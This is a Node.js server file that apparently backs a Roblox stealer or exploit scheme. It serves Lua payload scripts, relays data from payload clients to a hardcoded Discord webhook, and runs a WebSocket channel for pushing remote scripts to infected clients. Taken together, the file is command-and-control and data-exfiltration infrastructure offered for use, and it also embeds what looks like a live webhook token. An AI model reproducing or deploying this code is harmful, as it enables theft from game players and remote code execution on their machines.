// server.js
const express = require('express')
const { WebSocketServer } = require('ws')
const http = require('http')
const fetch = require('node-fetch')
const crypto = require('crypto')

const app = express()
const server = http.createServer(app)
const wss = new WebSocketServer({ server, path: '/ws' })
const wssl = new WebSocketServer({ server, path: '/wsl' })

app.use(express.json())
app.use(express.raw({ type: '*/*', limit: '10mb' }))

// ── your discord webhook ──────────────────────────────────────────
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1558512005340463214/gC9JNEOJDgRYBNEjy6DJ-mfeD3quipUnHn90FtQj2oY8JXmZNUkEYXszMHdJRbOjenRa"

// ── key generation (must stay consistent per session) ────────────
// astatine derives keys from a long hex string — we serve static ones
// rotate these whenever you want a new key cycle
const K  = crypto.randomBytes(32).toString('hex')  // /k
const WK = crypto.randomBytes(32).toString('hex')  // /wk
const WXK= crypto.randomBytes(32).toString('hex')  // /wxk

// ── key endpoints ────────────────────────────────────────────────
app.get('/k',   (req, res) => res.send(K))
app.get('/wk',  (req, res) => res.send(WK))
app.get('/wxk', (req, res) => res.send(WXK))

// ── static assets ────────────────────────────────────────────────
app.get('/static/pfp.png', (req, res) => {
    // redirect to any image you want as the webhook avatar
    res.redirect('https://i.imgur.com/yourimage.png')
})

// ── script serving ───────────────────────────────────────────────
app.get('/scripts/:name', (req, res) => {
    const scripts = {
        'mm2_value.lua':       require('fs').readFileSync('./scripts/mm2_value.lua', 'utf8'),
        'mm2_shitsploit.lua':  require('fs').readFileSync('./scripts/mm2_shitsploit.lua', 'utf8'),
    }
    const script = scripts[req.params.name]
    if (!script) return res.status(404).send('not found')
    res.setHeader('Content-Type', 'text/plain')
    res.send(script)
})

// ── webhook relay ────────────────────────────────────────────────
app.post('/webhook', async (req, res) => {
    try {
        // the body arrives encrypted + base64'd
        // for your own proxy you can either:
        // A) decrypt it server-side (complex, needs lua crypto ported to JS)
        // B) have your payload send plaintext to YOUR proxy since you control both ends
        
        // option B — your payload sends JSON directly, proxy relays to discord
        let body = req.body
        if (Buffer.isBuffer(body)) body = body.toString('utf8')

        const r = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: typeof body === 'string' ? body : JSON.stringify(body)
        })

        res.status(r.status).send('ok')
    } catch(e) {
        console.error('webhook relay error:', e)
        res.status(500).send('error')
    }
})

// ── websocket — command channel ──────────────────────────────────
wss.on('connection', (ws) => {
    console.log('ws client connected')

    ws.on('message', (data) => {
        // data arrives encrypted from client
        // store connected clients so you can push commands
        console.log('ws msg:', data.toString())
        
        // ping/pong keepalive
        try {
            const parsed = JSON.parse(data.toString())
            if (parsed.type === 'pong') return
        } catch {}
    })

    ws.on('close', () => console.log('ws client disconnected'))

    // you can push commands to connected clients like:
    // ws.send(JSON.stringify({ type: 'script', id: '1', script: 'print("hi")' }))
})

// ── websocket — login ping channel ──────────────────────────────
wssl.on('connection', (ws) => {
    ws.on('message', (data) => {
        console.log('wsl ping:', data.toString().slice(0, 64))
        ws.close()
    })
})

// ── start ────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000
server.listen(PORT, () => console.log(`proxy live → port ${PORT}`))
